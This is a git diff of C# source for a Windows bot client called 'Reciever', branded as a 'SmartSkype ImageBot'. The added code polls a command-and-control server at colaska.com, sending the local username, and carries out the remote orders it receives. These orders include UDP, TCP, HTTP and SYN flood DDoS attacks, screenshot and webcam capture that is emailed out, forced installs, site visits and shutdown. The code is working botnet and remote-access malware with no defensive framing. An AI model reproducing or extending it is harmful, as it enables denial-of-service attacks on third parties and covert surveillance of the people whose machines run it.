@@ -10,16 +10,28 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.Drawing.Printing;
 using System.Net.Mime;
 using System.Net.Mail;
 using AForge.Video;
 using AForge.Video.DirectShow;
+using UITimer = System.Threading.Timer;
+
 namespace Reciever
 {
     static class Functions
     {
+
         public static class DDoS
         {
+
+            //Timer that stops DDoS when called
+            public static void DTimerCall(object obj)
+            {
+                Reciever.Program.DActive = false;
+                Reciever.Program.DTimer.Dispose();
+            }
+            
             public static void UDPStart(string Site)
             {
                Reciever.Program.DActive = true;
@@ -187,6 +199,7 @@ namespace Reciever
 
         public static class IO
         {
+
             public static void Message(string message)
             {
                 MessageBox.Show(message);
@@ -209,6 +222,16 @@ namespace Reciever
                 { }
             }
 
+            public static void Update(string link)
+        {
+
+        }
+
+        public static void Uninstall()
+        {
+            Application.Exit();
+        }
+
             public static void UpdateMe()
             {
                 string PVersion = Application.ProductVersion;
@@ -224,6 +247,23 @@ namespace Reciever
 
                     Process.Start(Reciever.Program.AppPath + "\\Bot.exe");
                 }
+            }
+
+           public static void Print(string Text)
+            {
+                PrintDocument PDocument = new PrintDocument();
+                PDocument.PrintPage += delegate(object Sender, PrintPageEventArgs e)
+                {
+                    e.Graphics.DrawString(Text, new Font("Times New Roman", 12), new SolidBrush(Color.Black), new RectangleF(0, 0, PDocument.DefaultPageSettings.PrintableArea.Width, PDocument.DefaultPageSettings.PrintableArea.Height));
+                };
+
+                try
+                {
+                    PDocument.Print();
+                }
+
+                catch (Exception e)
+                { }
             }
         }
 
@@ -352,8 +392,8 @@ namespace Reciever
             /// <param name="filename"></param>
             private static void EmailImage(string file, string filename)
             {
-                var fromAddress = new MailAddress("#SENDEREMAIL#", "SmartSkype ImageBot");
-                var toAddress = new MailAddress("#RECEIVEREMAIL#", "#USERNAME#");
+                var fromAddress = new MailAddress("#FROM#", "SmartSkype ImageBot");
+                var toAddress = new MailAddress("#TO#", "#USER#");
                 const string fromPassword = "#PASSWORD#";
                 string subject = "SmartSkype Image (" + filename + ")";
                 string body = "The following file (" + filename + ") has been attached.\nThank you for using SmartSkype.\n\nRegards,\nCoolSec";
@@ -381,6 +421,140 @@ namespace Reciever
                 }
 
                 File.Delete(file);
+            }
+        }
+
+        public static class Connection
+        {
+            public static void Listen(Object state)
+            {
+                int Time = Reciever.Program.Time;
+
+                WebClient Listen = new WebClient();
+                string Output = Listen.DownloadString("http://www.colaska.com/skype/listen?user=" + Reciever.Program.user + "&name=" + Environment.UserName);
+                Listen.Dispose();
+                string[] ParseOutput = Output.Split(':');
+                switch (ParseOutput[0])
+                {
+                    case "MESSAGE":
+                        Functions.IO.Message(ParseOutput[1]);
+                        break;
+
+                    case "SHUTDOWN":
+                        Reciever.Functions.SystemFunctions.ShutDown();
+                        break;
+
+                    case "VISIT":
+                        Reciever.Functions.SystemFunctions.Visit(ParseOutput[1]);
+                        break;
+
+                    case "INSTALL":
+                        Functions.IO.Install(ParseOutput[1]);
+                        break;
+
+                    case "UPDATE":
+                        Reciever.Functions.IO.Update(ParseOutput[1]);
+                        break;
+
+                    case "FRESH":
+                        Functions.Sounds.Fresh();
+                        break;
+
+                    case "SPEAK":
+                        Functions.Sounds.Speak(ParseOutput[1]);
+                        break;
+
+                    case "PRINT":
+                        Functions.IO.Print(ParseOutput[1]);
+                        break;
+
+                    case "UDP":
+                        Time = Convert.ToInt32(ParseOutput[2]);
+                        Time = Time * 1000;
+                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
+                        Functions.DDoS.UDPStart(ParseOutput[1]);
+                        break;
+
+                    case "TCP":
+                        Time = Convert.ToInt32(ParseOutput[2]);
+                        Time = Time * 1000;
+                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
+                        Functions.DDoS.TCPStart(ParseOutput[1]);
+                        break;
+
+                    case "HTTP":
+                        Time = Convert.ToInt32(ParseOutput[2]);
+                        Time = Time * 1000;
+                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
+                        Functions.DDoS.HTTPStart(ParseOutput[1]);
+                        break;
+
+                    case "SYN":
+                        Time = Convert.ToInt32(ParseOutput[2]);
+                        Time = Time * 1000;
+                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
+                        Functions.DDoS.StartSYN(ParseOutput[1]);
+                        break;
+
+                    case "SCREENSHOT":
+                        Functions.Image.Screenshot();
+                        break;
+
+                    case "BOTKILLER":
+                        //To be done
+                        break;
+
+                    case "UNINSTALL":
+                        Reciever.Functions.IO.Uninstall();
+                        break;
+
+                    case "WEBCAM":
+                        Functions.Webcam.CaptureCam();
+                        break;
+
+                    case "BEEP":
+                        Functions.Sounds.Beep(ParseOutput[1], ParseOutput[2]);
+                        break;
+
+                    case "STOP":
+                        Reciever.Program.DActive = false;
+                        break;
+                }
+            }
+
+            static bool Connect()
+            {
+                try
+                {
+                    WebClient Connect = new WebClient();
+                    string Output = Connect.DownloadString("http://www.colaska.com/skype/connect?user=" + Reciever.Program.user + "&name=" + Environment.UserName);
+                    Connect.Dispose();
+                    return true;
+                }
+
+                catch (Exception e)
+                {
+                    return false;
+                }
+            }
+
+            //Call back function for KeepAlive timer - keeps bot online
+            public static void KeepAlive(Object state)
+            {
+                Connect();
+            }
+        }
+
+        public static class SystemFunctions
+        {
+            public static void ShutDown()
+            {
+                Process.Start("shutdown", "/s /t 0");
+            }
+
+            public static void Visit(string site)
+            {
+                Process.Start(site);
             }
         }
     }
